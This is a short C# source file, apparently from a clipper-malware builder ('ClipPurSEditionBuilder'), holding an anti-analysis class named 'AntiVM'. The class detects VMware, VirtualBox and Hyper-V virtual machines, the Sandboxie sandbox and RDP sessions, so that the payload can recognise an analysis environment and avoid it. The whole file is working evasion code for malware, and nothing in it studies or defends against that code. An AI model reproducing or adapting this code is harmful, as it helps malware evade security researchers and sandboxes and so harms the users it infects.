namespace ClipPurSEditionBuilder.Sticks
{
    using System;
    using System.Diagnostics;
    using System.Management;
    using System.Windows.Forms;

    internal class AntiVM
    {
        private static bool GetDetectVirtualMachine()
        {
            using (ManagementObjectCollection mb = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem").Get())
            {
                foreach (ManagementBaseObject mbj in mb)
                {
                    try
                    {
                        string str = mbj["Manufacturer"].ToString().ToLower();
                        bool strTo = mbj["Model"].ToString().ToLower().Contains("virtual");
                        if ((str.Equals("microsoft corporation") && strTo) || str.Contains("vmware") || mbj["Model"].ToString().Equals("VirtualBox"))
                        {
                            return true;
                        }
                    }
                    catch (Exception) { return false; }
                }
            }
            return false;
        }
        private static bool IsRdpAvailable => SystemInformation.TerminalServerSession == true;
        private static bool SBieDLL() => Process.GetProcessesByName("wsnm").Length > 0 || NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() != 0;

        public static bool GetCheckVMBot() => SBieDLL() || IsRdpAvailable || GetDetectVirtualMachine();
    }
}